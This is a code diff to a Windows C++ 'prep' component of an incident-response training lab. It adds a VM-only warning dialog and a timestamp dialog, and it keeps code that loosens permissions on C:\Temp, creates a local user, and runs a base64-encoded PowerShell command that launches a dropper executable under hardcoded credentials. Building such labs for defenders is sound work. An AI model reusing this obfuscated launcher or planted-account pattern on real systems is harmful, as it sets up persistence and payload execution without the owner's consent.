@@ -4,16 +4,28 @@ std::string componentName = "prep";
 
 int wmain()
 {
+    MsgBoxWarning();
+    
     //HANDLE ghMutex = CreateMutexW(NULL, FALSE, L"Lab6LogMutex");
 
     std::filesystem::create_directory(L"C:\\Temp");
     std::filesystem::permissions(L"C:\\Temp", std::filesystem::perms::all);
-    //std::ofstream log("C:\\Temp\\lab6logs.txt");
+    //std::string filepath = "C:\\Temp\\lab6logs.txt";
+    //std::ofstream log(filepath);
     //if (log.is_open()) {
     //    log << "Lab 6 Logs" << std::endl;
     //}
     //log.close();
-    //std::filesystem::permissions("C:\\Temp\\lab6logs.txt", std::filesystem::perms::all);
+    //std::filesystem::permissions(filepath, std::filesystem::perms::all);
+    //_chmod(filepath.c_str(), _S_IREAD | _S_IWRITE);
+    //LPSTR file = const_cast<char*>(filepath.c_str());
+    //SetNamedSecurityInfoA(
+    //    file,
+    //    SE_FILE_OBJECT,
+
+    //);
+
+
     
     Log("[+] Starting " + componentName + ".", componentName);
     Log("[*] Running as " + GetUserAndContext(), componentName);
@@ -65,12 +77,31 @@ int wmain()
     // Start-Process C:\\Temp\\dropper.exe -Credential $credential;
     std::string cmdline = "powershell.exe -encodedCommand JAB1AHMAZQByAG4AYQBtAGUAIAA9ACAAJwBSAGEAdgBlAG4AJwA7ACAAJABwAGEAcwBzAHcAbwByAGQAIAA9ACAAJwBQAGEAcwBzAHcAbwByAGQAMQAhACcAOwAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkACAAPQAgAEMAbwBuAHYAZQByAHQAVABvAC0AUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIAAkAHAAYQBzAHMAdwBvAHIAZAAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUAOwAgACQAYwByAGUAZABlAG4AdABpAGEAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACAAJAB1AHMAZQByAG4AYQBtAGUALAAgACQAcwBlAGMAdQByAGUAUABhAHMAcwB3AG8AcgBkADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAQwA6AFwAXABUAGUAbQBwAFwAXABkAHIAbwBwAHAAZQByAC4AZQB4AGUAIAAtAEMAcgBlAGQAZQBuAHQAaQBhAGwAIAAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAOwA=";
     
+    MsgBoxStart();
+
     CreateProc("dropper", cmdline);
     //CloseHandle(ghMutex);
 
     // TODO: pop message box saying completed and give activity timestamps
 
     return 0;
+}
+
+void MsgBoxWarning() {
+    LPCSTR text = "THIS EXECUTABLE WILL DAMAGE THE COMPUTER IT IS RUN ON.\n\n"
+        "Click \"Yes\" to confirm you are running this in a VM.\n"
+        "Click \"No\" to exit the program.";
+    LPCSTR caption = "Active Cyber Defense Windows IR Lab";
+    int msgResp = MessageBoxA(
+        NULL,
+        text,
+        caption,
+        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2 | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
+    );
+
+    if (msgResp == IDNO) {
+        exit(0);
+    }
 }
 
 void CreateUser(std::wstring username, std::wstring password) {
@@ -134,4 +165,20 @@ void CreateUser(std::wstring username, std::wstring password) {
         Log("[!] Error adding user " + std::string(username.begin(), username.end()) + " to local group: " + std::to_string(err), componentName);
         break;
     }
+}
+
+void MsgBoxStart() {
+    std::time_t t = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
+    std::string ts = std::ctime(&t);
+    ts.resize(ts.size() - 1);
+    ts = "Incident start timestamp (record this!):\n" + ts;
+    LPCSTR text = ts.c_str();
+    LPCSTR caption = "Active Cyber Defense Windows IR Lab";
+    MessageBoxA(
+        NULL,
+        text,
+        caption,
+        MB_OK | MB_ICONINFORMATION | MB_TASKMODAL | MB_SETFOREGROUND | MB_TOPMOST
+    );
+
 }
